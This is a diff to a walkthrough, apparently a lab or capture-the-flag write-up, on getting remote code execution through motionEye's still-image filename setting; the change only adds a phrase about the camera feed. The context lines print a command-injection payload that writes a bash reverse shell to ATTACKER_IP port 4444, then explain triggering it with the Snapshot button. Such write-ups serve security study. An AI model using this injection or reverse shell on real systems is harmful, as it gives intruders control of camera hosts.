@@ -348,7 +348,7 @@ We can then attempt a RCE shell via the Settings -> Still Images -> Image File N
 $(echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /tmp/rce.sh).%Y-%m-%d-%H-%M-%S
 ```
 
-Before attempting to execute the `rce.sh` file via motionEye's exploit we need to "restart" the config file or reset motionEye so the changes apply on the backend of the machine. This can be done a multiltude of ways but easiest is by simply clicking the "Snapshot" button.
+Before attempting to execute the `rce.sh` file via motionEye's exploit we need to "restart" the config file or reset motionEye so the changes apply on the backend of the machine. This can be done a multiltude of ways but easiest is by simply clicking the "Snapshot" button on the actualy camera feed.
 
 We can then setup a listener on our attacker machine and execute the `rce.sh` file via bash on motionEye's interface.
 
